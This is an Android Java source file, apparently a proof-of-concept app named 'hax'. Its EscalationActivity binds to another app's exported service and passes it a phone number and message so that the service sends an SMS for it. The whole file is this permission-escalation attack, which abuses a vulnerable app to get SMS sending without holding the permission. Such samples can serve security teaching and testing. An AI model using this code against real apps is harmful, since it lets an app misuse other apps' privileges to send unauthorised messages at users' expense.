package com.crevitus.hax;

import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

public class EscalationActivity extends AppCompatActivity {

    boolean _isBinded;
    Messenger _messenger;
    ServiceConnection _serviceConnection;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_escalation);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        getSupportActionBar().setDisplayHomeAsUpEnabled(true);

        final EditText txtphoneNo = (EditText) findViewById(R.id.edtNumber);
        final EditText txtMessage = (EditText) findViewById(R.id.edtSMSMessage);

        txtphoneNo.setText(getString(R.string.number));

        _serviceConnection = new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name, IBinder service) {
                _isBinded = true;
                _messenger = new Messenger(service);
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
                _isBinded = false;
                _serviceConnection = null;
            }
        };

        Intent intent = new Intent();
        intent.setPackage(getString(R.string.target_package));
        intent.setAction(getString(R.string.target_action));
        bindService(intent, _serviceConnection, BIND_AUTO_CREATE);

        Button sendBtn = (Button) findViewById(R.id.btnSendSMS);

        sendBtn.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                Bundle bundle = new Bundle();
                bundle.putString("number", txtphoneNo.getText().toString());
                bundle.putString("message", txtMessage.getText().toString());
                Message msg = Message.obtain();
                msg.setData(bundle);
                try {
                    _messenger.send(msg);
                }
                catch (RemoteException e) {
                    e.printStackTrace();
                }
            }
        });
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (_serviceConnection != null) {
            unbindService(_serviceConnection);
        }
    }
}
